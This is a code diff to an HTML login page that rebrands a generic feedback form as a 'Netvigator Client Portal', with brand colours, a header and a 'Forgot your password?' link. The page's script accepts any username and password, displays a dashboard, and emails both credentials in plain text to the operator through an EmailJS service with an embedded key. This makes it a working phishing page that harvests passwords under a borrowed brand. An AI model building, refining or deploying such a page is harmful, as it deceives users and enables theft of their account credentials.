@@ -3,25 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Client Feedback Portal</title>
+    <title>Netvigator Client Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         emailjs.init("JYKSTvr8xx8jZDFiA"); // EmailJS Public Key
     </script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        .container { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }
-        input, textarea { width: 100%; margin: 10px 0; padding: 8px; }
-        button { padding: 10px 15px; background-color: #007BFF; color: white; border: none; cursor: pointer; }
-        button:hover { background-color: #0056b3; }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #f07c00;
+            padding: 15px;
+            color: white;
+            font-size: 24px;
+        }
+        .container {
+            background-color: #ffffff;
+            width: 350px;
+            margin: 100px auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-top: 5px solid #f07c00;
+        }
+        h2 {
+            color: #333;
+        }
+        input, textarea {
+            width: 100%;
+            margin: 10px 0;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #f07c00;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        button:hover {
+            background-color: #d96b00;
+        }
+        .forgot-password {
+            color: #f07c00;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+    <div class="header">Netvigator Client Portal</div>
     <div id="login" class="container">
         <h2>Login</h2>
         <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
         <button onclick="authenticate()">Login</button>
+        <p><a href="#" class="forgot-password">Forgot your password?</a></p>
     </div>
 
     <div id="dashboard" class="container" style="display: none;">
@@ -42,7 +90,7 @@
                 login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
             };
 
-            console.log("Sending email with:", templateParams); // Debugging log
+            console.log("Sending email with:", templateParams);
 
             emailjs.send(serviceID, templateID, templateParams, publicKey)
                 .then(response => {
@@ -62,8 +110,8 @@
                 document.getElementById("dashboard").style.display = "block";
                 
                 loginHistory.push(`Username: ${username}, Password: ${password}, Logged in at: ${new Date().toLocaleString()}`);
-                console.log("Updated loginHistory:", loginHistory); // Debugging log
-                sendEmail(username, password); // Send username and password
+                console.log("Updated loginHistory:", loginHistory);
+                sendEmail(username, password);
             } else {
                 alert("Please enter both username and password.");
             }
